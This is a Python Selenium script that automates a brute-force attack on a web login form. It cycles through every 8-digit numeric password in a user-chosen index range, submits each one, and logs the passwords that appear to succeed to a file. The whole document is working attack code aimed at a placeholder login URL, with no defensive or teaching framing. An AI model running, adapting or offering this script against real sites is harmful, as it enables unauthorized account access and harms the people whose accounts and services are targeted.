from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import itertools

# Set your Chrome driver path
driver_path = '/path/to/your/chromedriver'

# Login URL
login_url = 'http://example.com/login'

# Selectors
password_field_selector = '#password'
login_button_selector = '#login-button'
successful_login_selector = '#success-message'  # Example selector for successful login

def brute_force_login(start, end):
    # Initialize the Chrome driver
    service = Service(driver_path)
    driver = webdriver.Chrome(service=service)
    driver.get(login_url)

    print('Starting brute-force!')

    # Open a file to store successful login attempts
    with open("successful_logins.txt", "a") as file:
        try:
            # Wait until the password field is present
            WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, password_field_selector)))
            print("Password field located successfully.")

            # Generate combinations within the given range
            combinations = (''.join(p) for p in itertools.product('0123456789', repeat=8))
            combinations = list(itertools.islice(combinations, start, end))

            # Iterate through each combination
            for count, password in enumerate(combinations):
                # Locate the password field and login button
                password_field = WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, password_field_selector)))
                login_button = WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.CSS_SELECTOR, login_button_selector)))

                # Enter the password and click login
                password_field.clear()
                password_field.send_keys(password)
                login_button.click()

                try:
                    # Check if successful login element is present
                    WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.CSS_SELECTOR, successful_login_selector)))
                    successful_login_element = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, successful_login_selector)))
                    success_message = f'Login successful with password: {password}. Name: {successful_login_element.text}'
                    print(success_message)
                    file.write(success_message + "\n")
                    file.flush()
                    driver.get(login_url)
                except:
                    try:
                        # Check if login button selector is not present (indicating successful login)
                        driver.find_element(By.CSS_SELECTOR, login_button_selector)
                        print(f"Login failed for password: {password}. Returning to login page.")
                    except:
                        success_message = f'Login successful with password: {password}. Button not found.'
                        print(success_message)
                        file.write(success_message + "\n")
                        file.flush()
                        driver.get(login_url)

        except Exception as e:
            print(f'An error occurred: {e}')
        finally:
            driver.quit()

if __name__ == "__main__":
    # Set the range for the brute-force attack
    start_index = int(input("Enter the start index: "))
    end_index = int(input("Enter the end index: "))
    brute_force_login(start_index, end_index)
